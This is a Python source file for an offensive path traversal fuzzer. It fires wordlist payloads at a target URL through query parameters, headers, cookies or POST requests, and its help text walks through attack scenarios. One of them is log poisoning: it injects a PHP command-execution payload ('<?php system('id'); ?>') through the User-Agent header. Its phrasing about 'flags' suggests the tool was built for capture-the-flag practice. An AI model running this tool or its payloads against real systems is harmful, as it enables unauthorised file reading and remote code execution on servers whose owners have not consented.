#!/usr/bin/env python3
"""
02-Traversal-Probe/probe.py
Author: Sanchez (The Architect)
Purpose: Path Traversal Fuzzer — Updated for "Total Football" (Headers/Cookies/POST)
"""

import argparse
import sys
import os
from pathlib import Path
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ———— THE NECESSARY CRIME 🕵️‍♂️ ————
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from core import engine, logger, config, get_banner
config.FORCE_HTTP2 = True
# We import the "Total Football" version of check_traversal
from modules.traversal import check_traversal

def parse_headers_and_cookies(header_list: list) -> tuple[dict, dict]:
    """
    Parses raw header strings into separate Headers and Cookies dictionaries.
    Tactical precision required here.
    """
    headers = {}
    cookies = {}
    
    if not header_list:
        return headers, cookies

    for h in header_list:
        if ':' not in h:
            continue
            
        key, value = h.split(":", 1)
        key = key.strip()
        value = value.strip()
        
        # Sanchez Special: If it's a Cookie, move it to the cookie jar 🍪
        if key.lower() == "cookie":
            # Handle "id=1; lang=en"
            cookie_parts = value.split(";")
            for part in cookie_parts:
                if "=" in part:
                    c_key, c_val = part.split("=", 1)
                    cookies[c_key.strip()] = c_val.strip()
            logger.info(f"🍪 Loaded Cookies → {Fore.YELLOW}{cookies}{Style.RESET_ALL}")
        else:
            headers[key] = value
            logger.info(f"💉 Injected Header → {Fore.CYAN}{key}: {value[:30]}...{Style.RESET_ALL}")

    return headers, cookies

def load_payloads(filepath: str | Path) -> list[str]:
    """Load and clean payloads from wordlist (Ignoring comments)."""
    path = Path(filepath).expanduser().resolve()
    if not path.is_file():
        logger.critical(f"Wordlist missing: {path}")
        sys.exit(1)

    # Sanchez Fix: We filter out lines that start with '#'
    payloads = [
        line.strip() 
        for line in path.read_text().splitlines() 
        if line.strip() and not line.strip().startswith("#")
    ]
    
    logger.info(f"Loaded {len(payloads):,} active payloads ← {path.name}")
    return payloads

def get_arg_parser() -> argparse.ArgumentParser:
    # ———— THE FIX ————
    # Use double braces {{ }} to escape them in f-strings!
    desc = f"""
{Fore.RED}    The Sanchez Traversal Probe v2.0 🚀
    "If the door is locked, we go through the walls."{Style.RESET_ALL}
    """
    
    examples = f"""{Fore.CYAN}EXAMPLES:{Style.RESET_ALL}
  {Fore.GREEN}# 1. The Standard Attack{Style.RESET_ALL}
  python3 probe.py -u "http://target.com/load?file={{PAYLOAD}}" -w payloads.txt

  {Fore.GREEN}# 2. The Cookie Poisoning (Scenario 1){Style.RESET_ALL}
  python3 probe.py -u "http://target.com/" -w payloads.txt -H "Cookie: lang={{PAYLOAD}}"

  {Fore.GREEN}# 3. The Log Poisoning (Scenario 3){Style.RESET_ALL}
  python3 probe.py -u "http://target.com/logs.php" -w payloads.txt -H "User-Agent: <?php system('id'); ?>"
    """

    parser = argparse.ArgumentParser(
        description=desc,
        epilog=examples,
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Targeting Group
    target_group = parser.add_argument_group(f'{Fore.RED}TARGETING{Style.RESET_ALL}')
    target_group.add_argument("-u", "--url", required=True, 
                        help="Target URL. Use {PAYLOAD} as marker.")
    target_group.add_argument("-w", "--wordlist", required=True, 
                        help="Path to the payload wordlist.")
    
    # Sanchez Update: Changed flag to -H for standard convention
    target_group.add_argument("-H", "--header", dest="headers", action="append", default=[],
                        help="Add header/cookie. Ex: -H 'Cookie: lang=en'")
    
    # NEW: Method Override (For forced POST attacks without php://input)
    target_group.add_argument("-M", "--method", default="GET", choices=["GET", "POST"],
                        help="HTTP Method (Default: GET).")

    # Tactics Group
    tactics_group = parser.add_argument_group(f'{Fore.BLUE}TACTICS{Style.RESET_ALL}')
    tactics_group.add_argument("--delay", type=float, 
                        help="Delay between requests (seconds).")
    tactics_group.add_argument("-t", "--threads", type=int, default=10,
                        help="Concurrency level.")

    return parser

if __name__ == "__main__":

    print(get_banner("seek and you shall find"))

    args = get_arg_parser().parse_args()

    # ———— CONFIG SETUP ————
    if args.delay:
        config.DELAY = args.delay
    
    if args.threads:
        config.THREADS = args.threads

    # ———— PARSE HEADERS & COOKIES ————
    # We parse them here to pass them EXPLICITLY to the engine
    final_headers, final_cookies = parse_headers_and_cookies(args.headers)

    logger.info(f"Target locked: {args.url}")

    payloads = load_payloads(args.wordlist)
    if not payloads:
        logger.error("No ammo loaded. Exiting.")
        sys.exit(1)

    # ———— KICK OFF ————
    # NOTE: We assume engine.run passes **kwargs to the task_function (check_traversal)
    # This is how we pass the static headers/cookies to every request!
    hits = engine.run(
        task_function=check_traversal,
        targets=payloads,
        base_url=args.url,
        method=args.method,     # Pass the Method
        headers=final_headers,  # Pass the Headers
        cookies=final_cookies,  # Pass the Cookies
        desc="Path Traversal"
    )

    # ———— VICTORY CEREMONY ————
    if hits:
        print()
        logger.info(f"TRAVERSAL ACHIEVED | {len(hits)} HITS")
        for i, hit in enumerate(hits[:15], 1):
            logger.info(f"  {i:2d}. {hit}")
        print()
        logger.info("Go collect your flags, king.")
    else:
        logger.warning("Target is solid. No gaps found.")